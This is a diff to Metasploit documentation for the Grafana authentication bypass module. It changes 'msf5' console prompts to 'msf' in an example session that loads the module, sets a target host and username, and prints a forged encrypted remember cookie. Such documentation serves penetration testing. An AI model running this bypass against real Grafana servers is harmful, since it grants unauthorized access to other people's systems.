@@ -22,8 +22,8 @@ The following list shows the vulnerable versions of Grafana when configured for 
   Example run against Grafana 3.x with username admin:
 
 ```
-msf5 > use auxiliary/admin/http/grafana_auth_bypass 
-msf5 auxiliary(admin/http/grafana_auth_bypass) > show options 
+msf > use auxiliary/admin/http/grafana_auth_bypass 
+msf auxiliary(admin/http/grafana_auth_bypass) > show options 
 
 Module options (auxiliary/admin/http/grafana_auth_bypass):
 
@@ -38,11 +38,11 @@ Module options (auxiliary/admin/http/grafana_auth_bypass):
    USERNAME                    no        Valid username
    VERSION    5                yes       Grafana version: "2-4" or "5" (Accepted: 2-4, 5)
 
-msf5 auxiliary(admin/http/grafana_auth_bypass) > set RHOSTS 192.168.202.3
+msf auxiliary(admin/http/grafana_auth_bypass) > set RHOSTS 192.168.202.3
 RHOSTS => 192.168.202.3
-msf5 auxiliary(admin/http/grafana_auth_bypass) > set USERNAME Administrator
+msf auxiliary(admin/http/grafana_auth_bypass) > set USERNAME Administrator
 USERNAME => Administrator
-msf5 auxiliary(admin/http/grafana_auth_bypass) > run
+msf auxiliary(admin/http/grafana_auth_bypass) > run
 
 [*] Running for 192.168.202.3...
 [+] Encrypted remember cookie: 1bedc565c40b58307afa4672efd72d3c37f02684c2deb0ce0b55594cbce337fc90625356dc232e998f
